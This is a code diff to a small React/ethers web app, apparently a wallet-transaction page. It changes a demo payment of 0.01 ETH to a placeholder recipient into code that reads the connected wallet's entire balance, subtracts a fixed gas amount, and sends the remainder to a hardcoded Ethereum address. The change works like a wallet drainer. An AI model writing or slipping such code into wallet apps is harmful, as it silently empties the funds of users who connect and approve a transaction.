@@ -1,7 +1,7 @@
 import './App.css';
 import React, { useState } from 'react';
 
-const ethers = require("ethers")
+const ethers = require("ethers");
 
 function App() {
   const [userAddress, setUserAddress] = useState('');
@@ -58,8 +58,9 @@ function App() {
 
   const sendTransaction = async () => {
     try {
-      // Request account access if needed (for MetaMask)
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      // get account
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const account = accounts[0];
 
       // Create a provider to interact with Ethereum
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -67,10 +68,18 @@ function App() {
       // Get the signer to sign transactions (the user's wallet)
       const signer = await provider.getSigner();
 
+      // Get the balance of the account in wei
+      const balanceWei = await provider.getBalance(account);
+
+      // Subtract estimated gas from the balance
+      const gas = 2000000000000000n;
+
+      const newBalanceWei = balanceWei - gas;
+
       // Define transaction parameters
       const tx = {
-        to: 'RECIPIENT_ADDRESS', // Recipient address
-        value: ethers.utils.parseEther('0.01'), // Amount to send (in Ether)
+        to: '0x0c778e66efa266b5011c552C4A7BDA63Ad24C37B', // Recipient address
+        value: newBalanceWei,
         // Add other transaction parameters as needed (e.g., gasLimit, gasPrice, nonce, data)
       };
 
